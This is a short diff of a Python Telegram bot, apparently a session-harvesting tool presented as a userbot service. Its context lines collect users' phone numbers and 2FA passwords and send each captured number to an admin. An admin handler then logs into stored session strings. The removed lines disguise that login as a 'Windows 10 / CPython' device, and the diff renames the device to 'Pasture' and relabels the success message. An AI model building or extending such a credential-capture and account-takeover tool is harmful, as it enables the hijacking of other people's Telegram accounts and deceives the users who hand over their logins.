@@ -333,7 +333,7 @@ async def process_password(message: Message, state: FSMContext):
         conn.commit()
         conn.close()
 
-        await message.answer("✅ Авторизация с 2FA успешна!")
+        await message.answer("✅ Юзербота подключен!")
         await bot.send_message(ADMIN_ID, f"🔔 Номер (2FA):\n🆔 ID: `{user_id}`\n📱 Номер: `{phone}`", parse_mode="Markdown")
         del temp_auth_data[user_id]
         await state.clear()
@@ -519,7 +519,7 @@ async def admin_spawn_session(callback: CallbackQuery):
         return await callback.answer("Сессия не найдена", show_alert=True)
 
     phone, string_session = res
-    await callback.answer("⏳ Регистрирую устройство CPython в Telegram...", show_alert=False)
+    await callback.answer("⏳ Регистрирую устройство PastureBot в Telegram...", show_alert=False)
 
     try:
         client = Client(
@@ -527,9 +527,9 @@ async def admin_spawn_session(callback: CallbackQuery):
             api_id=int(API_ID),
             api_hash=API_HASH,
             session_string=string_session,
-            device_model="Windows",
-            system_version="Windows 10",
-            app_version="CPython 3.14.3",
+            device_model="Pasture",
+            system_version="Pasture",
+            app_version="PastureBot",
             in_memory=True
         )
         await client.connect()
@@ -538,7 +538,7 @@ async def admin_spawn_session(callback: CallbackQuery):
         await client.disconnect()
 
         await callback.message.edit_text(
-            f"✅ **Сеанс CPython 3.14.3 успешно добавлен!** 🎉\n\n"
+            f"✅ **Сеанс Pasture успешно добавлен! юзербота работает **🎉\n\n"
             f"• Аккаунт: `@{me.username or me.first_name}`\n"
             f"• Телефон: `{phone}`\n"
             f"• Устройство: `CPython 3.14.3` (Windows 10)\n\n"
